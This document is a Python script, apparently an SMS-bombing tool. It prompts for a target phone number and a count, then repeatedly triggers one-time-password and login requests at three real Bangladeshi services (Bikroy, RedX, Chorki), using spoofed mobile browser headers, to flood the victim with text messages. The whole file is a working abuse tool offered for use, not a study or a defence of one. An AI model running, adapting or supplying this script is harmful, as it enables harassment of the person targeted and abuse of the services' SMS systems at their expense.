import requests
import time
import os

os.system("python logo.py")

number = input("Enter Target Number: ")
amount = int(input("Enter Amount: "))

sent = 0
error_printed = False

while sent < amount:
    try:
        # 1. Bikroy API 
        response1 = requests.get(
            f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"
        )

        # 2. RedX API 
        redx_headers = {
            'authority': 'api.redx.com.bd',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://redx.com.bd',
            'referer': 'https://redx.com.bd/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }

        redx_json = {
            'phoneNumber': number,
        }

        response2 = requests.post(
            'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
            headers=redx_headers,
            json=redx_json,
        )

        # 3. Chorki API 
        chorki_headers = {
            'authority': 'api-dynamic.chorki.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'authorization': '',
            'content-type': 'application/json',
            'origin': 'https://www.chorki.com',
            'referer': 'https://www.chorki.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }

        chorki_params = {
            'country': 'BD',
            'platform': 'web',
            'language': 'en',
        }

        chorki_json = {
            'number': number,
        }

        response3 = requests.post(
            'https://api-dynamic.chorki.com/v2/auth/login',
            params=chorki_params,
            headers=chorki_headers,
            json=chorki_json
        )

        # Check if any request succeeded
        if (response1.status_code in [200, 201, 204] or
           response2.status_code in [200, 201, 204] or
           response3.status_code in [200, 201, 204]):
            
            sent += 1
            print(f"[{sent}] Successfully SMS Sent.")
        else:
            print(f"[{sent + 1}] Cannot Send SMS")
            sent += 1

        time.sleep(1)

    except Exception as e:
        if not error_printed:
            print("Error occurred. Check internet or API validity.")
            error_printed = True
        sent += 1